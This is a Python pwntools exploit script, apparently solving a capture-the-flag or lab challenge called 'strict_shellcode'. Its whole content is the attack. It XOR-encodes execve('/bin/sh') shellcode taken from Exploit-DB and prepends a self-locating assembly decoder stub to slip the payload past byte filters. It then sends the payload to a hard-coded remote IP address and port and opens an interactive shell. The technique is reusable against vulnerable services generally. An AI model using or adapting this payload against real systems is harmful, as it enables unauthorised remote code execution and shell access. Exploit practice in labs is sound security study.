from pwn import *

context.arch = 'amd64'
context.os = 'linux'


key = 0x2

# https://www.exploit-db.com/exploits/46907
sh_sc = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54' +\
	b'\x5f\x6a\x3b\x58\x99\x0f\x05'
enc_sh_sc = bytes(map(lambda b: b ^ key, sh_sc))

decrypt = f"""
	jmp begin
	nop
get_pc:
	mov rdi, [rsp]
	ret

begin:
	call get_pc		/* rdi = rip */
	xor rcx, rcx
	mov cl, {len(sh_sc)}	/* len(sc) */
decrypt:
	/* 16 = length of the instructions up to and including `loop` - 1 */
	lea rdx, [rdi + 16]
	add rdx, rcx
	xor byte ptr [rdx], {key}
	loop decrypt
"""

# p = process('./strict_shellcode')
p = remote('141.85.224.106', 31341)

payload = asm(decrypt) + enc_sh_sc
p.sendline(payload)

p.interactive()
